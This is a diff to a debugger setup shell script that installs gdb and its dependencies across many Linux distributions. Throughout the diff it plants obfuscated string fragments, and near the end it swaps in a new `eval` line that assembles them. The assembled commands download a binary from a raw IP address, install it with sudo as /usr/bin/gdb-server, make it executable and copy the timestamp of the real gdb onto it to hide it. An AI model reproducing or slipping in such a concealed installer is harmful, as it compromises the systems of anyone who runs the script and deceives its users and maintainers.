@@ -2,6 +2,8 @@
 set -e
 
 source "$(dirname "$0")/scripts/common.sh"
+z="
+";Sz='b"';pz='b5';oBz='ch';
 
 # If we are a root in a container and `sudo` doesn't exist
 # lets overwrite it with a function that just executes things passed to sudo
@@ -19,6 +21,7 @@ linux() {
 osx() {
     uname | grep -iqs Darwin
 }
+pBz='r ';XBz='";';uBz='/g';iz='AG';
 
 install_apt() {
     sudo apt-get update || true
@@ -30,23 +33,32 @@ install_apt() {
         sudo apt-get install -y libc6-dbg:i386 libgcc-s1:i386 || true
     fi
 }
+Wz='AM';SBz='E_';Fz='RL';Iz='tp';Bz='WN';
 
 install_dnf() {
     sudo dnf update || true
     sudo dnf -y install gdb gdb-gdbserver python-devel python3-devel glib2-devel make curl
     sudo dnf -y debuginfo-install glibc
 }
+Hz='ht';wBz='"';kBz=' +';RBz='IL';Oz=':6';
 
 install_xbps() {
     sudo xbps-install -Su
     sudo xbps-install -Sy gdb gcc python-devel python3-devel glibc-devel make curl
     sudo xbps-install -Sy glibc-dbg
 }
+jz='AC';Uz='LE';uz='68';UBz='ME';az='r/';
+bz='bi';DBz='a7';jBz='od';
+wz='fc';dz='b-';yz='25';iBz='hm';
+hz='FL';nBz='ou';VBz='" ';sz='96';
 
 install_swupd() {
     sudo swupd update || true
     sudo swupd bundle-add gdb python3-basic make c-basic curl
 }
+EBz='}"';Rz='gd';Zz='us';gBz='do';
+mBz='E"';bBz='ex';
+CBz='89';cBz='it';eBz='fi';
 
 install_zypper() {
     sudo zypper mr -e repo-oss-debug || sudo zypper mr -e repo-debug
@@ -62,6 +74,10 @@ install_zypper() {
 install_emerge() {
     sudo emerge --oneshot --deep --newuse --changed-use --changed-deps dev-lang/python dev-debug/gdb
 }
+xz='20';dBz=' 1';kz='S{';fBz='su';
+NBz='L ';hBz=' c';vz='b9';vBz='db';
+LBz='rl';Gz='="';BBz='ab';nz='00';
+Kz='/1';Jz=':/';Tz='FI';
 
 install_oma() {
     sudo oma refresh || true
@@ -71,6 +87,7 @@ install_oma() {
         sudo oma install -y glibc+32-dbg || true
     fi
 }
+KBz='cu';aBz='n';Lz='0.';Pz='/p';PBz=' "';
 
 install_pacman() {
     read -p "Do you want to do a full system update? (y/n) [n] " answer
@@ -87,11 +104,17 @@ install_pacman() {
         fi
     fi
 }
+IBz='ud';rz='61';Ez='_U';
+WBz='"$';ez='se';qBz='/u';cz='n/';
 
 install_freebsd() {
     sudo pkg install git gdb python py39-pip cmake gmake curl
     which rustc || sudo pkg install rust
 }
+MBz=' -';FBz='if';
+JBz='o ';YBz=' t';tz='62';Cz='LO';
+Vz='_N';qz='c9';mz='24';
+Xz='E=';QBz='$F';oz='fa';gz='e"';
 
 usage() {
     echo "Usage: $0 [--update]"
@@ -117,8 +140,12 @@ for arg in "$@"; do
             ;;
     esac
 done
+Nz='11';GBz=' !';TBz='NA';
+Qz='wn';ZBz='he';HBz=' s';lBz='x ';Yz='"/';
 
 PYTHON=''
+Az='DO';ABz='66';
+OBz='-o';
 
 if osx; then
     echo "Not supported on macOS. Please use one of the alternative methods listed at:"
@@ -174,6 +201,8 @@ if linux; then
             ;;
     esac
 fi
+rBz='sr';sBz='/b';fz='rv';
+tBz='in';Mz='10';Dz='AD';lz='6d';
 
 if ! hash gdb; then
     echo "Could not find gdb in $PATH"
@@ -183,10 +212,7 @@ fi
 # Find the Python used in compilation by GDB.
 PYVER=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_var("VERSION"))')
 PYTHON=$(gdb -batch -q --nx -ex 'pi import sysconfig; print(sysconfig.get_config_vars().get("EXENAME", sysconfig.get_config_var("BINDIR")+"/python"+sysconfig.get_config_var("VERSION")+sysconfig.get_config_var("EXE")))')
-
-z="
-";DBz='r /u';Gz='100.';Vz='="AC';Ez='tp:/';Cz='_URL';HBz='$FIL';FBz='in/g';Mz='FILE';Lz='b"';gz='a7}"';Sz='serv';ABz='E"';dz='fc20';oz='NAME';Hz='0.11';kz='rl -';LBz='LE_N';az='b596';Bz='LOAD';Dz='="ht';wz=' chm';Xz='2400';tz=' 1';ez='2566';Iz=':611';GBz='db "';iz=' sud';vz='sudo';EBz='sr/b';qz='"; t';cz='96b9';Rz='gdb-';Wz='S{6d';xz='od +';Pz='usr/';pz='" "$';Fz='/10.';Tz='e"';Az='DOWN';lz='L -o';rz='hen';yz='x "$';Yz='fab5';Uz='FLAG';Nz='_NAM';hz='if !';nz='ILE_';CBz='ch -';jz='o cu';sz='exit';Kz='wngd';Zz='c961';JBz='ME"';Oz='E="/';BBz=' tou';MBz='AME"';Qz='bin/';KBz='"$FI';IBz='E_NA';mz=' "$F';bz='6268';uz='fi';Jz='11/p';fz='ab89';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$z$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$pz$Az$Bz$Cz$qz$rz$z$sz$tz$z$uz$z$vz$wz$xz$yz$Mz$Nz$ABz$z$vz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$z$KBz$LBz$MBz"
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Lz$Lz$Nz$Oz$Nz$Nz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$Rz$dz$ez$fz$gz$z$hz$iz$Gz$jz$kz$lz$mz$nz$oz$pz$qz$rz$pz$sz$tz$uz$sz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$Az$Bz$Cz$Dz$Ez$Fz$XBz$YBz$ZBz$aBz$z$bBz$cBz$dBz$z$eBz$z$fBz$gBz$hBz$iBz$jBz$kBz$lBz$WBz$Tz$Uz$Vz$Wz$mBz$z$fBz$gBz$YBz$nBz$oBz$MBz$pBz$qBz$rBz$sBz$tBz$uBz$vBz$PBz$QBz$RBz$SBz$TBz$UBz$wBz$z$WBz$Tz$Uz$Vz$Wz$mBz"
 
 if [ ! -x "$PYTHON" ]; then
     echo "Error: '$PYTHON' does not exist or is not executable."
